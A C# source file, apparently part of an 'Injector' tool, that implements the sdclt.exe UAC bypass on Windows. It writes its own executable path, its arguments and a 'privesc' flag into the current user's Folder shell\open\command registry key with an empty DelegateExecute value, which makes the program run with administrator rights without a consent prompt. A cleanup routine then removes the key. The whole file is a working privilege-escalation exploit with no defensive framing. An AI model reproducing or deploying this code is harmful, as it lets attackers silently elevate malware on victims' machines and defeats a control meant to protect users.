﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;

namespace Injector.UACBypass
{
    public class sdclt
    {
        public static void bypass(string[] CmdLineArguments)
        {
            //get currrent path
           Console.WriteLine("Attempting sdclt.exe UAC Bypass");
           string exepath = System.Reflection.Assembly.GetEntryAssembly().Location;
           SetRegKey(exepath + " " + CmdLineArguments[0] + " " + CmdLineArguments[1] + " privesc");

        }

        public static void SetRegKey(string command)
        {
            const string userRoot = "HKEY_CURRENT_USER";
            const string key = userRoot + @"\Software\Classes\Folder\shell\open\command";

            Registry.SetValue(key, "", command);
            Registry.SetValue(key, "DelegateExecute", "");


        }

        public static void Cleanup()
        {
            const string keypath = @"Software\Classes\Folder\shell\open\command";

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keypath,true))
            {
                if (key == null)
                {
                  
                    // Key doesn't exist. Do whatever you want to handle
                    // this case
                }
                else
                { 
                    //key.DeleteSubKey("DelegateExecute");
                    key.DeleteSubKey("");
                }
            }
        }
    }
}
